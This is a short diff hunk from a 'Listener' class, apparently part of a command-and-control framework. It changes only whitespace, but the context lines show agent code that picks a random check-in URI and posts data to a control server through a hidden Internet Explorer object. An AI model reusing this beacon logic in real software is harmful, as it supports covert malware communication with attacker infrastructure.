@@ -455,7 +455,7 @@ class Listener:
                                     # choose a random valid URI for checkin
                                     $taskURI = $script:TaskURIs | Get-Random
                                     $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI
-
+                                    
                                     $Script:IE.navigate2($ServerURI, 14, 0, $bytes, $Null)
                                     while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
                                 }
